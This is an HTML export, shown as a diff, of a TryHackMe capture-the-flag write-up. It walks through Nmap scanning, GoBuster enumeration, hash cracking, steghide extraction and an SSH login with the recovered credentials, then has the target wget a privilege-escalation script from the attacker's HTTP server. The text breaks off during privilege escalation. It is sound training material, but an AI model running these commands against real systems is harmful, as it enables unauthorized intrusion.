@@ -1,0 +1,1503 @@
+<html>
+  <head>
+    <style>
+      .bibliography div {
+          text-indent: -1.5em;
+          padding-left: 1.5em;
+      }
+    </style>
+  </head>
+  <body>
+    <h1 id="817ffcc5-1779-4245-960a-841d7858125e"></h1>
+    <figure id="e61c5bf0-d521-11ef-a7f2-17531d96907d">
+      <img src="e61c5bf0-d521-11ef-a7f2-17531d96907d.jpeg" />
+      <figcaption>Figure 1 -</figcaption>
+    </figure>
+    <h1 id="e620a1b0-d521-11ef-a7f2-17531d96907d">Pentesting in Action</h1>
+    <p>
+      In this capture the flag (CTF) exercise, courtesy of TryHackMe, I
+      demonstrate my knowledge and proficiency with using tool to enumerate
+      hidden directories to get initial access to a vulnerable machine, and then
+      take advantage of privilege escalation vulnerabilities to gain root
+      access. The exercise requires use of the following pentesting elements:
+    </p>
+    <ul
+      pwa2-uuid="EDITOR-1A7-4D5-4C00D-688"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>Port scanning with Nmap</li>
+      <li>Directory enumeration with GoBuster</li>
+      <li>Hash cracking</li>
+      <li>Steganography</li>
+      <li>Privilege escalation</li>
+      <li>Bash reverse shell</li>
+    </ul>
+    <p>
+      I begin by navigating directly to the target IP address (10.10.27.91)
+      which is a default nginx web server page.
+    </p>
+    <figure id="e6224f60-d521-11ef-a7f2-17531d96907d">
+      <img src="e6224f60-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 2 -</figcaption>
+    </figure>
+    <p>
+      As a standard practice, I begin enumeration on the target with a Nmap scan
+      to identify which ports are open.
+    </p>
+    <p><b>sudo nmap -p- -T4 -sC -sV 10.10.27.91</b></p>
+    <ul
+      pwa2-uuid="EDITOR-2DD-CCC-4CA72-9D9"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>-p-: All ports</li>
+      <li>-T4: Sets scan time to aggressive for a faster scan (1-5)</li>
+      <li>-sC: Run default scripts</li>
+      <li>-sV: Determine service/version info</li>
+    </ul>
+    <p>
+      The port scan results reveal that there are three open ports (80, 6498 and
+      65524). Their services and versions are as follows:
+    </p>
+    <ul
+      pwa2-uuid="EDITOR-151-CAA-E91BC-27D"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>80: nginx 1.16.1</li>
+      <li>6498: OpenSSH 7.6p1</li>
+      <li>65524: Apache httpd 2.4.43</li>
+    </ul>
+    <figure id="e6249950-d521-11ef-a7f2-17531d96907d">
+      <img src="e6249950-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 3 -</figcaption>
+    </figure>
+    <p>
+      I already visited the nginx webpage on port 80, so next I proceed with
+      using GoBuster to enumerate directories using a standard GoBuster wordlist
+      and adding the -x flag to specify various extensions that I am interested
+      in searching for (txt, php, html, etc).
+    </p>
+    <p>
+      <b
+        >gobuster dir -u&nbsp;<a href="http://10.10.27.91/"
+          >http://10.10.27.91</a
+        >
+        -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+        -x.html,.css,.js,.txt,.php</b
+      >
+    </p>
+    <ul
+      pwa2-uuid="EDITOR-0E7-E5F-3F8BB-E9B"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>dir: Specifies using directory enumeration mode</li>
+      <li>-u: URL followed by the url</li>
+      <li>-w: wordlist followed by the wordlist file to use</li>
+    </ul>
+    <p>
+      The enumeration uncovers one directory (“/hidden”) as well as an .html and
+      .txt file. I check both index.html and robots.txt, but neither offer any
+      clues.
+    </p>
+    <figure id="e6264700-d521-11ef-a7f2-17531d96907d">
+      <img src="e6264700-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 4 -</figcaption>
+    </figure>
+    <figure id="e626e340-d521-11ef-a7f2-17531d96907d">
+      <img src="e626e340-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 5 -</figcaption>
+    </figure>
+    <figure id="e627a690-d521-11ef-a7f2-17531d96907d">
+      <img src="e627a690-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 6 -</figcaption>
+    </figure>
+    <p>
+      Next, I navigate to the “/hidden” directory. Nothing stands out so I will
+      also look at the source code by using ctrl + u to see if there are any
+      easter eggs, which is common in these capture the flag exercises.
+      Unfortunately, this doesn’t yield any clues.
+    </p>
+    <figure id="e62869e0-d521-11ef-a7f2-17531d96907d">
+      <img src="e62869e0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 7 -</figcaption>
+    </figure>
+    <figure id="e6297b50-d521-11ef-a7f2-17531d96907d">
+      <img src="e6297b50-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 8 -</figcaption>
+    </figure>
+    <p>
+      I then perform another GoBuster directory scan on the “/hidden” directory.
+    </p>
+    <p>
+      <b
+        >gobuster dir -u&nbsp;<a
+          href="http://10.10.27.91/hidden%20-w%20/usr/share/wordlists/dirb/common.txt"
+          >http://10.10.27.91/hidden -w /usr/share/wordlists/dirb/common.txt</a
+        >
+        -x.html,.css,.js,.txt,.php</b
+      >
+    </p>
+    <figure id="e62a8cc0-d521-11ef-a7f2-17531d96907d">
+      <img src="e62a8cc0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 9 -</figcaption>
+    </figure>
+    <p>
+      This enumerates a hidden directory, “/whatever”. This page has no content
+      other than just an image, but looking into the source code I uncover a
+      clue encoded in base64.
+    </p>
+    <p><b>ZmxhZ3tmMXJzN19mbDRnfQ==</b></p>
+    <figure id="e62b7720-d521-11ef-a7f2-17531d96907d">
+      <img src="e62b7720-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 10 -</figcaption>
+    </figure>
+    <figure id="e62c8890-d521-11ef-a7f2-17531d96907d">
+      <img src="e62c8890-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 11 -</figcaption>
+    </figure>
+    <p>
+      I can decode the base64 by using the echo command on my terminal and then
+      using a pipe with the base64 decode command (-d).
+    </p>
+    <p><b>echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d</b></p>
+    <p>This reveals the first flag.</p>
+    <figure id="e62dc110-d521-11ef-a7f2-17531d96907d">
+      <img src="e62dc110-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 12 -</figcaption>
+    </figure>
+    <p>
+      I have enumerated everything I can on http port 80, so next I pivot and
+      perform enumeration on the other open web server port, 65524. This brings
+      up the Apache 2 default welcome page.
+    </p>
+    <figure id="e62e5d50-d521-11ef-a7f2-17531d96907d">
+      <img src="e62e5d50-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 13 -</figcaption>
+    </figure>
+    <p>Scrolling down, an easily identifiable flag is present in cleartext.</p>
+    <figure id="e62f6ec0-d521-11ef-a7f2-17531d96907d">
+      <img src="e62f6ec0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 14 -</figcaption>
+    </figure>
+    <p>
+      Once again, I can use GoBuster to seek out more directories by specifying
+      the port number, 65524, after the IP address.
+    </p>
+    <p>
+      <b
+        >gobuster dir -u&nbsp;<a href="http://10.10.27.91:65524/"
+          >http://10.10.27.91:65524</a
+        >
+        -w /usr/share/wordlists/dirb/common.txt -x.html,.css,.js,.txt,.php</b
+      >
+    </p>
+    <figure id="e630a740-d521-11ef-a7f2-17531d96907d">
+      <img src="e630a740-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 15 -</figcaption>
+    </figure>
+    <p>
+      This enumerates another robots.txt file located on this port. I navigate
+      to it and find a hash under the User-Agent. Using the Kali tool
+      “hash-identifier”, I verify that it is a MD5 hash.
+    </p>
+    <p><b>hash-identifier a18672860d0510e5ab6699730763b250</b></p>
+    <figure id="e6316a90-d521-11ef-a7f2-17531d96907d">
+      <img src="e6316a90-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 16 -</figcaption>
+    </figure>
+    <figure id="e633db90-d521-11ef-a7f2-17531d96907d">
+      <img src="e633db90-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 17 -</figcaption>
+    </figure>
+    <p>
+      Using the site MS5Hashing.net, I am able to decode the hash and gather the
+      2nd flag.
+    </p>
+    <figure id="e6351410-d521-11ef-a7f2-17531d96907d">
+      <img src="e6351410-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 18 -</figcaption>
+    </figure>
+    <p>
+      Snooping around some more on the source code for 10.10.27.92:65524, I
+      discover another hidden hash. After attempting several types of hash
+      types, I finally succeed with the base62 decode. This reveals what appears
+      to be a hidden directory.
+    </p>
+    <figure id="e6362580-d521-11ef-a7f2-17531d96907d">
+      <img src="e6362580-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 19 -</figcaption>
+    </figure>
+    <figure id="e6369ab0-d521-11ef-a7f2-17531d96907d">
+      <img src="e6369ab0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 20 -</figcaption>
+    </figure>
+    <p>
+      I navigate to this hidden directory “/n0th1ng3ls3m4tt3r” and check the
+      source code which contains another hash.
+    </p>
+    <figure id="e639f610-d521-11ef-a7f2-17531d96907d">
+      <img src="e639f610-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 21 -</figcaption>
+    </figure>
+    <figure id="e63b0780-d521-11ef-a7f2-17531d96907d">
+      <img src="e63b0780-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 22 -</figcaption>
+    </figure>
+    <p>
+      I can attempt to crack this hash with a brute force tool such as John the
+      Ripper. This essentially means using a wordlist and inputting each
+      potential password from the wordlist into the hash function to see if we
+      get a hash equivalent output that is equal to any of the hashes stored in
+      the database. Performing a brute force attack can take an extremely long
+      time, so this lab provided me with a curated wordlist to speed up the
+      process. I can preview this wordlist by using the head command to see the
+      first 10 lines of the file:
+    </p>
+    <p><b>head easypeasy.txt</b></p>
+    <figure id="e63cb530-d521-11ef-a7f2-17531d96907d">
+      <img src="e63cb530-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 23 -</figcaption>
+    </figure>
+    <p>
+      I go ahead create a text file “hash.txt” by using the echo command to
+      write the hash to it.
+    </p>
+    <figure id="e63e14c0-d521-11ef-a7f2-17531d96907d">
+      <img src="e63e14c0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 24 -</figcaption>
+    </figure>
+    <p>
+      With the Kali tool “hash-identifier”, I can cat out the hash and pipe it
+      to hash-identifier to determine that it is a SHA256 hash.
+    </p>
+    <p><b>cat hash.txt | hash-identifier</b></p>
+    <figure id="e63f4d40-d521-11ef-a7f2-17531d96907d">
+      <img src="e63f4d40-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 25 -</figcaption>
+    </figure>
+    <p>
+      Using John the Ripper, I specify the format of the hash to crack (sha256),
+      the wordlist (easy_peasy.txt) and the hash (hash.txt).
+    </p>
+    <figure id="e64037a0-d521-11ef-a7f2-17531d96907d">
+      <img src="e64037a0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 26 -</figcaption>
+    </figure>
+    <p>
+      This didn’t yield a result, so after trying some of the other possible
+      hashes I finally have success with the GOST hash format to reveal that the
+      hashed password is “<b>mypasswordforthatjob”.</b>
+    </p>
+    <figure id="e6414910-d521-11ef-a7f2-17531d96907d">
+      <img src="e6414910-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 27 -</figcaption>
+    </figure>
+    <p>
+      I was stuck on this step for a bit after looking around more through the
+      source code but eventually ascertained that the image on this site
+      suggests it could contain a code or password (steganography), so I go
+      ahead and save the image.
+    </p>
+    <figure id="e642a8a0-d521-11ef-a7f2-17531d96907d">
+      <img src="e642a8a0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 28 -</figcaption>
+    </figure>
+    <p>
+      Using the Kali tool “steghide”, I specify an extract argument with -sf
+      (found by reading through the steghide help file,&nbsp;<b
+        >steghide –help</b
+      >). This extracts the data to a secrettext.txt file which I then cat out.
+    </p>
+    <p><b>steghide extract -sf binarycodepixabay.jpg</b></p>
+    <figure id="e6440830-d521-11ef-a7f2-17531d96907d">
+      <img src="e6440830-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 29 -</figcaption>
+    </figure>
+    <figure id="e645b5e0-d521-11ef-a7f2-17531d96907d">
+      <img src="e645b5e0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 30 -</figcaption>
+    </figure>
+    <p>
+      This revealed the username&nbsp;<b>boring</b> and a password in binary.
+      Using CyberChef, I converted the output to a text password:
+    </p>
+    <p><b>iconvertedmypasswordtobinary</b></p>
+    <figure id="e646ee60-d521-11ef-a7f2-17531d96907d">
+      <img src="e646ee60-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 31 -</figcaption>
+    </figure>
+    <p>
+      Now that I have what seems to be the SSH login credentials, I can attempt
+      to SSH login to the target machine on port 6498 with the following
+      command:
+    </p>
+    <p><b>ssh boring@10.10.27.91 -p 6498</b></p>
+    <figure id="e647ffd0-d521-11ef-a7f2-17531d96907d">
+      <img src="e647ffd0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 32 -</figcaption>
+    </figure>
+    <p>
+      Once I’m logged in, I view files and directories with the ls command. This
+      shows a user.txt file which contains a flag “synt{a0jvgf33zfa0ez4y}”.
+      However, this flag appears to have some type of cipher encoding applied
+      to.
+    </p>
+    <figure id="e6491140-d521-11ef-a7f2-17531d96907d">
+      <img src="e6491140-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 33 -</figcaption>
+    </figure>
+    <p>
+      Using CyberChef again, I attempt several cipher rotations to rotate each
+      character by various numeric amounts. The output for a 13-digit rotation
+      of each character yields a successful deciphering of the flag,
+      “flag{n0wits33msn0rm4l}”.
+    </p>
+    <figure id="e64a22b0-d521-11ef-a7f2-17531d96907d">
+      <img src="e64a22b0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 34 -</figcaption>
+    </figure>
+    <p>
+      Lastly, the challenge required for me to capture a flag on the root user,
+      so I will have to discover a way to escalate privileges. LinPEAS is a
+      widely used script that searches for possible paths to escalate privileges
+      on Linux/Unix*/MacOS hosts. Some common types of vulnerabilities and
+      misconfigurations that linPEAS can help identify include the following:
+    </p>
+    <ol
+      pwa2-uuid="EDITOR-A10-FB1-18F65-0E4"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>Misconfigured Sudo Rights</li>
+      <li>SUID and SGID files</li>
+      <li>Scheduled tasks and cron jobs</li>
+      <li>Weak file permissions and sensitive files</li>
+      <li>Plain text passwords and keys</li>
+      <li>Environment variables and misconfigured services</li>
+    </ol>
+    <p>
+      I refer to the LinPEAS documentation to install the linpeas.sh script onto
+      my Kali machine.
+    </p>
+    <p>
+      <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS"
+        >https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a
+      >
+    </p>
+    <figure id="e64c1e80-d521-11ef-a7f2-17531d96907d">
+      <img src="e64c1e80-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 35 -</figcaption>
+    </figure>
+    <p>
+      In order to transfer LinPEAS to the target, I’ll use my Kali to start a
+      HTTP server that the target can access the linpeas.sh from. Using python,
+      I will setup the http server and specify the port, which will then serve
+      the contents of the current directory which includes the linpeas.sh
+      script. 8080 is a common port to use for HTTP servers. Once it begins
+      serving the directory contents, I can navigate to on a webpage to confirm
+      it is publicly accessible.
+    </p>
+    <p><b>python3 -m http.server 8080</b></p>
+    <figure id="e64d08e0-d521-11ef-a7f2-17531d96907d">
+      <img src="e64d08e0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 36 -</figcaption>
+    </figure>
+    <figure id="e64dcc30-d521-11ef-a7f2-17531d96907d">
+      <img src="e64dcc30-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 37 -</figcaption>
+    </figure>
+    <p>
+      From the target machine, I can use the command&nbsp;<b>wget</b> to install
+      linpeas.sh.
+    </p>
+    <p>
+      <b>wget&nbsp;</b
+      ><a href="http://10.2.14.66:8080/linpeas.sh"
+        >http://10.2.14.66:8080/linpeas.sh</a
+      >
+    </p>
+    <figure id="e64edda0-d521-11ef-a7f2-17531d96907d">
+      <img src="e64edda0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 38 -</figcaption>
+    </figure>
+    <p>
+      Back on my Kali terminal, I can see the HTTP.GET request come in from the
+      target:
+    </p>
+    <figure id="e64fa0f0-d521-11ef-a7f2-17531d96907d">
+      <img src="e64fa0f0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 39 -</figcaption>
+    </figure>
+    <p>
+      Now I can execute linpeas.sh; however, it returns with a permission
+      denied.
+    </p>
+    <figure id="e6506440-d521-11ef-a7f2-17531d96907d">
+      <img src="e6506440-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 40 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_4CD9A-C907C-68F59-175D9-2E"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+        ><pwa
+          data-pwa-id="eae4f1cd-bd7e-423f-8197-e678645853da"
+          data-pwa-hint="Unknown word: ls"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="as~s~us~is~la"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 54.375px; width: 15.1771px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="5c294d6d-99fe-4615-a329-da2b432eee60"
+          data-pwa-hint="Missing comma after prepositional phrase"
+          data-pwa-heavy="true"
+          data-pwa-rule-id="MISSING-COMMA_PREPPHRASE_PWCE"
+          data-pwa-help-id="MISSING-COMMA_PREPPHRASE_PWCE"
+          data-pwa-report="grammarheavy"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="la,"
+          data-pwa-help-article-id="1000157"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 84.6771px; width: 17.3021px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="3ecd2662-e8bc-4076-8ffd-f6e3276cfcc0"
+          data-pwa-hint='Remove the word "that" to make your writing shorter and clearer.'
+          data-pwa-heavy="false"
+          data-pwa-rule-id="READABILITY_2834"
+          data-pwa-help-id="READABILITY_2834"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="morereadable"
+          data-pwa-suggestions="I see this file is"
+          data-pwa-help-article-id="1000043"
+          data-pwa-style-color="5"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 107.135px; width: 174.958px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="b4ced4c8-2ef4-4002-bdcb-332231f513d6"
+          data-pwa-hint="Unknown word: chmod"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="chm'd~hmo'd~chmn'd~chemo'd~schmo'd"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 539.469px; width: 63.0417px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="5071c6dc-027c-47e5-b8cc-8240d35b679f"
+          data-pwa-hint="Possible missing colon"
+          data-pwa-heavy="true"
+          data-pwa-rule-id="MISSING_COLON_PWCE"
+          data-pwa-help-id="MISSING_COLON_PWCE"
+          data-pwa-report="grammarheavy"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="permissions:"
+          data-pwa-help-article-id="1000021"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 75.3333px; left: 8.66669px; width: 109.167px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      With&nbsp;<b>ls -la</b> I see that this file is not executable, so I will
+      use&nbsp;<b>chmod</b> to change the permissions. In Linux, each file and
+      directory has three types of permissions
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_3145D-11052-DA8BB-C0AD3-B7"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 32px; width: 663.667px; height: 72px; z-index: 1;"
+        ><pwa
+          data-pwa-id="8795319e-437a-4646-b6ee-e8448df5f1b1"
+          data-pwa-hint="Make sure that all of the quotations and brackets in this paragraph are closed."
+          data-pwa-heavy="false"
+          data-pwa-rule-id="STRUCT_PUNCT_PARENTHESES"
+          data-pwa-help-id="STRUCT_PUNCT_PARENTHESES"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions=""
+          data-pwa-help-article-id="1000153"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 65.3333px; left: 106.865px; width: 8.88538px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 32px; width: 663.667px; height: 72px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <ul
+      pwa2-uuid="EDITOR-029-139-5E646-AC2"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>Read (r)</li>
+      <li>Write (w)</li>
+      <li>Execute (x)</li>
+    </ul>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_A790C-67979-A7144-2E8E3-9D"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="6b416376-b573-4e1e-a623-5b1803d2945c"
+          data-pwa-hint="Passive verbs hide the subject of your sentence. Try to rewrite this sentence using an active verb with the most suitable subject."
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SSG_PASSIVE_VOICE_ALL"
+          data-pwa-help-id="SSG_PASSIVE_VOICE_ALL"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="passive"
+          data-pwa-suggestions=""
+          data-pwa-help-article-id="1000155"
+          data-pwa-style-color="4"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3334px; left: 8.66669px; width: 363.948px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="ec4b3e79-ece2-47ac-87e2-e01c95e3ec9c"
+          data-pwa-hint="Readability may be enhanced by using: different"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="READABILITY_1566"
+          data-pwa-help-id="READABILITY_1566"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="morereadable"
+          data-pwa-suggestions="different"
+          data-pwa-style-color="5"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3334px; left: 459.969px; width: 154.302px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      These three permission types can be set for three different types of
+      users:
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_75A90-8C87E-653AD-3EFEE-EB"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 32px; width: 663.667px; height: 72px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 32px; width: 663.667px; height: 72px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <ul
+      pwa2-uuid="EDITOR-090-AA9-B3E35-2DF"
+      pwa-fake-editor=""
+      spellcheck="false"
+    >
+      <li>User (u)</li>
+      <li>Group (g)</li>
+      <li>Others (o)</li>
+    </ul>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_1074B-503DD-1C3A3-4CB9F-0F"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 112px; z-index: 1;"
+        ><pwa
+          data-pwa-id="08b2fe7f-3713-4dd0-b1a0-1219660f1e9d"
+          data-pwa-hint="Unknown word: chmod"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="chm'd~hmo'd~chmn'd~chemo'd~schmo'd"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 46.1042px; width: 62.6667px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="2264d13d-22c0-4cfe-b2ad-54f23eab02c2"
+          data-pwa-hint="Missing comma after introductory phrase"
+          data-pwa-heavy="true"
+          data-pwa-rule-id="MISSING-COMMA_INWORD_PWCE"
+          data-pwa-help-id="MISSING-COMMA_INWORD_PWCE"
+          data-pwa-report="grammarheavy"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="user,"
+          data-pwa-help-article-id="1008106"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 75.3333px; left: 342.094px; width: 38.9584px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 112px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      The chmod command can be used in two modes (symbolic or numeric). I will
+      use numeric mode to set permissions to read (4), write (2) and execute (1)
+      for each user. Therefore, for each user I define this with the value “7”,
+      and to apply for each user would be “777”.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_A75E7-55F29-00998-FE722-9D"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="aa9b7c81-696d-41a8-9951-94ec9cb078d3"
+          data-pwa-hint="Possible confused word"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="CRFSR_SH_23"
+          data-pwa-help-id="CRFSR_SH_23"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="eh"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3334px; left: 182.531px; width: 21.3125px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>chmod 777 linpeas.sh</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_43EB5-430E6-846DC-62C84-0C"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 349.885px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 349.885px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e652fc50-d521-11ef-a7f2-17531d96907d">
+      <img src="e652fc50-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 41 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
